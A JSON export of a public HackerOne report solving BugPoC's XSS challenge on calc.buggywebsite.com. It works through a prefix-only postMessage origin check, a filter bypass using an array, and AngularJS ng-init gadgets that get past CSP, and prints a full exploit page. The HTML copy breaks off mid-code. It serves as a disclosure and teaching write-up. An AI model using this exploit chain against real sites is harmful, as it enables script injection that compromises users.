{"id":954249,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTQyNDk=","url":"https://hackerone.com/reports/954249","title":"Solution for XSS challenge calc.buggywebsite.com","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-08-09T07:21:35.962Z","submitted_at":"2020-08-09T07:21:36.199Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"d1r3wolf","url":"/d1r3wolf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/v3k5gr6QFfVf4pGryaVXyw3p/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":49074,"url":"https://hackerone.com/bugpoc","handle":"bugpoc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"BugPoC","twitter_handle":"bugpoc_official","website":"http://bugpoc.com","about":"A Platform to Build and Share Proof-of-Concepts for Bug Bounty Submissions, PenTest Deliverables, \u0026 Red Team Reports."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-15T18:32:53.986Z","bug_reporter_agreed_on_going_public_at":"2020-08-15T18:32:15.200Z","team_member_agreed_on_going_public_at":"2020-08-15T18:32:53.910Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nhttp://calc.buggywebsite.com/ is a angular site designed as a calculator.\nAfter observing the source code , there is iframe (frame.html) with functionality of displaying the data of postmessage in the webpage.\n```js\nwindow.addEventListener(\"message\", receiveMessage, false);\n\nfunction receiveMessage(event) {\n\n\t// verify sender is trusted\n\tif (!/^http:\\/\\/calc.buggywebsite.com/.test(event.origin)) {\n\t\treturn\n\t}\n\t// display message \n\tmsg = event.data;\n\tif (msg == 'off') {\n\t\tdocument.body.style.color = '#95A799';\n\t} else if (msg == 'on') {\n\t\tdocument.body.style.color = 'black';\n\t} else if (!msg.includes(\"'\") \u0026\u0026 !msg.includes(\"\u0026\")) {\n\t\tdocument.body.innerHTML=msg;\n\t}\n}\n```\nDirectly injecting the postMessage data into the HTML. we can achieve HTML injection if we can bypass the origin check.\n```js\nif (!/^http:\\/\\/calc.buggywebsite.com/.test(event.origin)) {\n```\nit's checking the origin is started with the `http://calc.buggywebsite.com`,  that's the first bug here origin it's doesn't make sure that the exact origin by checking ending with '/'. So we can continue the origin like `http://calc.buggywebsite.com.evil.com`. \n\nNow we achieved HTML injection on  `calc.buggywebsite.com`.\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003cbody\u003e\n\t\u003ciframe src=\"http://calc.buggywebsite.com/frame.html\" name=\"iframe1\" onload=\"runExpliot()\"\u003e\u003c/iframe\u003e\n\n\t\u003cscript type=\"text/javascript\"\u003e\n\t\tfunction runExpliot(){\n\t\t\tlet win = window.frames.iframe1;\n\t\t\tpayload = \"\u003ch1\u003eHTML InjectionM/h1\u003e\";\n  \t\t\twin.postMessage(payload, \"*\");\n\t\t}\n\t\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nBut here comes the main issue.\nWe can inject a script tag , but we cant force it to execute because the HTML is injected through `innerHTML`.\nThere is way `\u003cimg src=x onerror=alert(1)\u003e` or `\u003ciframe srcdoc='\u003cscript\u003ealert(1)\u003c/script\u003e'\u003e`, but inline execution is blocked through the CSP.\nCSP : `script-src 'unsafe-eval' 'self'`, we can only include self scripts, eval in script.\nThen  searched the gadgets in the app functionality.script-src 'unsafe-eval' 'self'. then gone through the script.js found one.\n```html\n\u003cbutton ng-click=\"calculate()\" ng-disabled=\"isOff\"\u003e=\u003c/button\u003e\n```\n```js\n$scope.calculate = function() {\n\t$scope.equation = eval($scope.equation).toString();\n\tsendEquation($scope.equation);\n}\n```\nevaluating the equation directly with out any sanitising , then gone through how the equation in build up, then found this.\n```html\n\u003cbutton ng-repeat=\"i in [7,8,9]\" ng-click=\"updateCurrNum(i)\" ng-disabled=\"isOff\"\u003e{{ i }}\u003c/button\u003e\n```\n```js\n$scope.updateCurrNum = function(num) {\n\tif($scope.isInit){\n\t\t$scope.equation = num.toString();\n\t\t$scope.isInit = false;\n\t} else \n\t\t$scope.equation += num;\n\tsendEquation($scope.equation);\n}\n```\n`num` value might be anything , it might be`alert(1)` there is no check implemented to make sure it is a digit or not.\n\nThrough the HTML injection we can use that to achieve XSS like.\n```html\n\u003cbutton ng-click=\"updateCurrNum('alert(document.domain);1')\"\u003eOFF\u003c/button\u003e\n\u003cbutton ng-click=\"calculate()\"\u003eOFF\u003c/button\u003e\n```\nBut it need the user interaction click, so searched for the `directive components in ng` in the angular js docs and found `ng-init` https://docs.angularjs.org/api/ng/directive/ngInit\nThrough which we can call the angular js functions automatically .\n```html\n\u003cbutton ng-init=\"updateCurrNum('alert(document.domain);1')\"\u003eOFF\u003c/button\u003e\n\u003cbutton ng-init=\"calculate()\"\u003eOFF\u003c/button\u003e\n```\n\nThe final payload is to get alert(document.domain)\n```html\n\u003cdiv ng-app=\"Calculator\" ng-cloak\u003e\n\t\u003cdiv ng-controller=\"ArthmeticController\" class=\"container\"\u003e\n\t\t\u003cbutton ng-init=\"updateCurrNum('alert(document.domain);1')\"\u003eOFF\u003c/button\u003e\n\t\t\u003cbutton ng-init=\"calculate()\"\u003eOFF\u003c/button\u003e\n\t\u003c/div\u003e\n\t\u003cscript src=\"angular.min.js\"\u003e\u003c/script\u003e\n\t\u003cscript src=\"jquery.min.js\"\u003e\u003c/script\u003e\n\t\u003cscript src=\"script.js\"\u003e\u003c/script\u003e\n\t\u003ciframe name=theiframe\u003e\u003c/iframe\u003e\n\u003c/div\u003e\n```\nwe need those scripts for the gadget, and CSP allows self scripts so no problem\nAs the script try to access the iframe object (theiframe), it's rises as error, to avoid it `\u003ciframe name=theiframe\u003e\u003c/iframe\u003e`.\n\nWe have to inject that HTML into `calc.buggywebsite.com` through postMessage.\nBut the payload contains script tags , script does loads through innerHTML injection, but we can use iframe srcdoc as the scripts are self , even CSP does n't bothers.\n```html\n\u003ciframe srcdoc=\"\u0026#x3C;div ng-app=\u0026#x22;Calculator\u0026#x22; ng-cloak\u0026#x3E;\u0026#x3C;div ng-controller=\u0026#x22;ArthmeticController\u0026#x22; class=\u0026#x22;container\u0026#x22;\u0026#x3E;\u0026#x3C;button ng-init=\u0026#x22;updateCurrNum(\u0026#x27;alert(document.domain);1\u0026#x27;)\u0026#x22;\u0026#x3E;OFF\u0026#x3C;/button\u0026#x3E;\u0026#x3C;button ng-init=\u0026#x22;calculate()\u0026#x22;\u0026#x3E;OFF\u0026#x3C;/button\u0026#x3E;\u0026#x3C;/div\u0026#x3E;\u0026#x3C;script src=\u0026#x22;angular.min.js\u0026#x22;\u0026#x3E;\u0026#x3C;/script\u0026#x3E;\u0026#x3C;script src=\u0026#x22;jquery.min.js\u0026#x22;\u0026#x3E;\u0026#x3C;/script\u0026#x3E;\u0026#x3C;script src=\u0026#x22;script.js\u0026#x22;\u0026#x3E;\u0026#x3C;/script\u0026#x3E;\u0026#x3C;iframe name=theiframe\u0026#x3E;\u0026#x3C;/iframe\u0026#x3E;\u0026#x3C;/div\u0026#x3E;\"\u003e\u003c/iframe\u003e\n```\nHere comes the final issue.\nOn frame.html before injecting into the HTML there is a last check in frame.js.\n```js\n} else if (!msg.includes(\"'\") \u0026\u0026 !msg.includes(\"\u0026\")) {\n\tdocument.body.innerHTML=msg;\n}\n```\nThe payload must not contains '\u0026' and ' , but our payload has \u0026. After trying many things, tried to bypass the check.\nmsg is nothing but postmessage data. The postMessage data might be anything a string or a list or a object.\n \nAs if the msg is string it checks char by char, so if it a list then it check index by index.\nSo tried innerHTML = [\"\u003ch1\u003eHTML injection\u003c/h1\u003e\"], It worked. so we can bypass the check by using list [\"\u003cpayload\u003e\"].\nFinal payload is (page must be on calc.buggywebsite.com.\u003cdomain.com\u003e)\n```\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003cbody\u003e\n\t\u003ciframe src=\"http://calc.buggywebsite.com/frame.html\" name=\"iframe1\" onload=\"runExpliot()\"\u003e\u003c/iframe\u003e\n\n\t\u003cscript type=\"text/javascript\"\u003e\n\t\tfunction runExpliot(){\n\t\t\tlet win = window.frames.iframe1;\n\t\t\tpayload = ['\u003ciframe srcdoc=\"\u0026#x3C;div ng-app=\u0026#x22;Calculator\u0026#x22; ng-cloak\u0026#x3E;\u0026#x3C;div ng-controller=\u0026#x22;ArthmeticController\u0026#x22; class=\u0026#x22;container\u0026#x22;\u0026#x3E;\u0026#x3C;button ng-init=\u0026#x22;updateCurrNum(\u0026#x27;alert(document.domain);1\u0026#x27;)\u0026#x22;\u0026#x3E;OFF\u0026#x3C;/button\u0026#x3E;\u0026#x3C;button ng-init=\u0026#x22;calculate()\u0026#x22;\u0026#x3E;OFF\u0026#x3C;/button\u0026#x3E;\u0026#x3C;/div\u0026#x3E;\u0026#x3C;script src=\u0026#x22;angular.min.js\u0026#x22;\u0026#x3E;\u0026#x3C;/script\u0026#x3E;\u0026#x3C;script src=\u0026#x22;jquery.min.js\u0026#x22;\u0026#x3E;\u0026#x3C;/script\u0026#x3E;\u0026#x3C;script src=\u0026#x22;script.js\u0026#x22;\u0026#x3E;\u0026#x3C;/script\u0026#x3E;\u0026#x3C;iframe name=theiframe\u0026#x3E;\u0026#x3C;/iframe\u0026#x3E;\u0026#x3C;/div\u0026#x3E;\"\u003e\u003c/iframe\u003e'];\n  \t\t\twin.postMessage(payload, \"*\");\n\t\t}\n\t\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Steps To Reproduce: (Proof on Concept)\n  1. Open https://bugpoc.com/poc#bp-u7KS3iYK\n  2. Use the password `USuAlSeaL04`\n  3. Run the POC , there u see's the pop up of alert(domain)\n\n## Note :\nStarted working on the challenge after seeing the mail, tweet (https://twitter.com/bugpoc_official/status/1291767806216765443) , but lately : (. \nI know this is too late , most of the people might solved it already. But choose to write an writeup as i have liked this challenge, as i have learned many things in order of solving this. This is my first experience with the angular js : ).\nThanks for nice challenge , expecting more challenges like this .\n\n## Impact\n\nSolved the challenge and achieved XSS on calc.buggywebsite.com","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"http://calc.buggywebsite.com/\" href=\"/redirect?url=http%3A%2F%2Fcalc.buggywebsite.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://calc.buggywebsite.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is a angular site designed as a calculator.\u003cbr\u003e\nAfter observing the source code , there is iframe (frame.html) with functionality of displaying the data of postmessage in the webpage.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddEventListener\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emessage\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ereceiveMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ereceiveMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// verify sender is trusted\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"sr\"\u003e/^http:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"sr\"\u003ecalc.buggywebsite.com/\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eorigin\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// display message \u003c/span\u003e\n    \u003cspan class=\"nx\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eoff\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estyle\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecolor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#95A799\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eon\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estyle\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecolor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eblack\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eincludes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eincludes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerHTML\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003emsg\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDirectly injecting the postMessage data into the HTML. we can achieve HTML injection if we can bypass the origin check.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"sr\"\u003e/^http:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"sr\"\u003ecalc.buggywebsite.com/\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eorigin\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eit\u0026#39;s checking the origin is started with the \u003ccode\u003ehttp://calc.buggywebsite.com\u003c/code\u003e,  that\u0026#39;s the first bug here origin it\u0026#39;s doesn\u0026#39;t make sure that the exact origin by checking ending with \u0026#39;/\u0026#39;. So we can continue the origin like \u003ccode\u003ehttp://calc.buggywebsite.com.evil.com\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eNow we achieved HTML injection on  \u003ccode\u003ecalc.buggywebsite.com\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://calc.buggywebsite.com/frame.html\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;iframe1\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonload=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;runExpliot()\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n\n    \u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/javascript\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erunExpliot\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ewin\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eframes\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eiframe1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;h1\u0026gt;HTML InjectionM/h1\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ewin\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut here comes the main issue.\u003cbr\u003e\nWe can inject a script tag , but we cant force it to execute because the HTML is injected through \u003ccode\u003einnerHTML\u003c/code\u003e.\u003cbr\u003e\nThere is way \u003ccode\u003e\u0026lt;img src=x onerror=alert(1)\u0026gt;\u003c/code\u003e or \u003ccode\u003e\u0026lt;iframe srcdoc=\u0026#39;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#39;\u0026gt;\u003c/code\u003e, but inline execution is blocked through the CSP.\u003cbr\u003e\nCSP : \u003ccode\u003escript-src \u0026#39;unsafe-eval\u0026#39; \u0026#39;self\u0026#39;\u003c/code\u003e, we can only include self scripts, eval in script.\u003cbr\u003e\nThen  searched the gadgets in the app functionality.script-src \u0026#39;unsafe-eval\u0026#39; \u0026#39;self\u0026#39;. then gone through the script.js found one.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eng-click=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;calculate()\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eng-disabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;isOff\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e=\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecalculate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eequation\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eequation\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etoString\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003esendEquation\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eequation\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eevaluating the equation directly with out any sanitising , then gone through how the equation in build up, then found this.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eng-repeat=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;i in [7,8,9]\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eng-click=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;updateCurrNum(i)\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eng-disabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;isOff\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e{{ i }}\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eupdateCurrNum\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003enum\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eisInit\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003e$scope\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eequation\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003enum\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan 